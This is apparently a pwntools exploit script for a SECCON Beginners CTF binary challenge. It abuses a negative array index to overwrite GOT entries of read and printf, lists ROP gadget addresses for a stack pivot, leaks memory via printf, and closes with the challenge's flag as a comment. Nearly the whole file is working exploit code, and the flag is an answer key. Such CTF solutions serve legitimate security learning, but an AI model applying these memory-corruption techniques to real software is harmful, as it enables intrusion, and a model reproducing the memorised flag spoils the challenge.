from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = "DEBUG"


gdbscript = '''
gef
# b readlong
b *0x4007C7
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
# io = remote('es.quals.beginners.seccon.jp', 9003)


addr_pop_rbp = 0x400658
addr_pop_rdi = 0x400893
addr_pop_rsi_r15 = 0x400891
addr_pop5 = 0x40088b
addr_leave = 0x40079c
addr_data = 0x0000000000601000
addr_pivot = addr_data + 0x500


io.recvuntil(b'index: ')
io.sendline(b'-2')
io.recvuntil(b'value: ')
io.sendline(b'%d' % elf.got['read'])
io.recvline()

payload = b''
payload += p64(elf.plt['read'] + 6)
payload += p64(0xdeadbeef)
payload += p64(elf.plt['printf'])
io.recvuntil(b'index: ')
io.sendline(payload)

payload = b''
payload += b'\x70'
io.recvuntil(b'value: ')
io.send(payload)

data = io.recv()
print(hexdump(data))
# addr_libc = u64(data.ljust(8, b'\x00')) - 0x884d0
# print('addr_libc = 0x{:x}'.format(addr_libc))

io.interactive()


# ctf4b{4bus1ng_st4ck_d03snt_n3c3ss4r1ly_m34n_0v3rwr1t1ng_r3turn_4ddr3ss}
